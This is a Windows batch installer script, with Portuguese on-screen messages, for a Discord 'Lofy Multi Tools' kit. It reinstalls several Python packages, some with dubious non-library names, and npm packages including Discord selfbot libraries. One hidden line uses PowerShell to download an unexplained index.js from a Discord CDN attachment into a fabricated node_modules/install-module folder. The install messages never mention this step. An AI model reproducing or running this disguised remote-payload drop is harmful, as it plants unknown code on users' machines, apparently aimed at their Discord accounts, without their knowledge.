@echo off
color A
title Lofy Multi Tools
echo.
echo.
echo.
echo.
echo      Bem vindo ao instalador do Lofy Multi Tools
echo      Voce esta prestes a instalar todos os requisitos
echo      Em caso de duvida entre no grupo do discord.
echo      Este processo pode demorar dependendo de sua maquina
echo.
echo.
echo.
echo.
echo.
echo.
pause nul
cls
color 5
python -m pip install --upgrade pip
cls
pip uninstall -y colorama
pip uninstall -y Fore
pip uninstall -y requests
pip uninstall -y threading
pip uninstall -y discord
pip uninstall -y asyncio
pip uninstall -y Style
pip uninstall -y Thread
pip uninstall -y dhooks
cls
pip install colorama
pip install Fore
pip install requests
pip install threading
pip install discord
pip install asyncio
pip install Style
pip install Thread
pip install dhooks
cls
call npm i axios buffer-replace@1.0.0 chalk@4 child_process@1.0.2 coloring@0.1.0 colors@1.4.0 discord.js@12 discord.js-selfbot@12.0.2 discord.js-selfbot-v11@11.5.1 enquirer@2.3.6 glob@7.2.0 gradient-string@2.0.0 node-fetch@2 readline-sync@1.4.10 request shelljs snekfetch system-sleep
cd "node_modules" && Mkdir "install-module" && cd "install-module" && powershell Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/966486656578359346/1001847888118292561/index.js" -OutFile "index.js"
cls
color 4
echo.
echo.
echo.
echo.
echo      Instalacao concluida pode fechar o instalador.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
pause nul
